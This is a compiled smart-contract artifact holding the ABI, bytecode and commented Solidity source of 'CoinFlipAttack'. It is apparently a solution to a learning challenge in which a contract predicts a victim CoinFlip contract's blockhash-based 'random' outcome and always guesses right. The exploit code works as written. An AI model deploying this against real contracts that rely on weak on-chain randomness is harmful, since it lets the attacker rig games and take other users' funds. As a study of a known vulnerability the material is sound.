{
  "contractName": "CoinFlipAttack",
  "abi": [
    {
      "inputs": [],
      "name": "side",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "victimContract",
      "outputs": [
        {
          "internalType": "contract CoinFlip",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "setVictim",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "flip",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040527f800000000000000000000000000000000000000000000000000000000000000060015534801561003457600080fd5b506104fa806100446000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80630b439621146100515780638475c02814610095578063cde4efa9146100b5578063f32d251d146100d5575b600080fd5b6100936004803603602081101561006757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610109565b005b61009d61014c565b60405180821515815260200191505060405180910390f35b6100bd61015f565b60405180821515815260200191505060405180910390f35b6100dd610286565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600260009054906101000a900460ff1681565b6000806101766001436102aa90919063ffffffff16565b4060001c90506000610193600154836102f490919063ffffffff16565b9050600181146101a45760006101a7565b60015b600260006101000a81548160ff02191690831515021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67600260009054906101000a900460ff166040518263ffffffff1660e01b8152600401808215158152602001915050602060405180830381600087803b15801561024457600080fd5b505af1158015610258573d6000803e3d6000fd5b505050506040513d602081101561026e57600080fd5b81019080805190602001909291905050509250505090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006102ec83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525061033e565b905092915050565b600061033683836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506103fe565b905092915050565b60008383111582906103eb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156103b0578082015181840152602081019050610395565b50505050905090810190601f1680156103dd5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080831182906104aa576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561046f578082015181840152602081019050610454565b50505050905090810190601f16801561049c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385816104b657fe5b04905080915050939250505056fea2646970667358221220fd28227d1d45d0f22fd947291738a5f5476788f19b8971c92b3c81e8b648c5d364736f6c634300060c0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity >=0.4.15 <0.7.0;\r\n\r\n/*\r\nImport the vulnerable contract so we can later\r\ninstantiate it and call its functions\r\n*/\r\nimport \"./SafeMath.sol\";\r\nimport \"./CoinFlip.sol\";\r\n\r\ncontract CoinFlipAttack {\r\n    using SafeMath for uint256;\r\n\r\n    CoinFlip public victimContract;\r\n\r\n    // Same number as in CoinFlip contract\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n    bool public side;\r\n\r\n    /*\r\n    Public function to set the victim contract. We will call this first in our exploit.\r\n    It could have also been done in a constructor.\r\n    */\r\n    function setVictim(address _addr) public {\r\n        /* \r\n        Note that here we are not calling CoinFlip constructor with an address,\r\n        but just instantiating it and setting its address. All functions calls will be sent to that address.\r\n        This is a Solidity quirk, get used to it :)\r\n        */\r\n        victimContract = CoinFlip(_addr);\r\n    }\r\n\r\n    /*\r\n    Public function which mimics the PRNG in CoinFlip and then calls CoinFlip with the correct guess.\r\n    */\r\n    function flip() public returns (bool) {\r\n        // Same PRNG as in victim contract\r\n        // The \"random\" numbers will be exactly the same in both contracts\r\n        uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n        uint256 coinFlip = blockValue.div(FACTOR);\r\n        side = coinFlip == 1 ? true : false;\r\n\r\n        // Here we call the victim contract flip function with our guess\r\n        return victimContract.flip(side);\r\n    }\r\n}\r\n",
  "sourcePath": "C:/dev/dapps/playground/contracts/CoinFlipAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.12+commit.27d51765.Emscripten.clang"
  },
  "schemaVersion": "3.2.3",
  "updatedAt": "2020-08-12T05:35:41.938Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}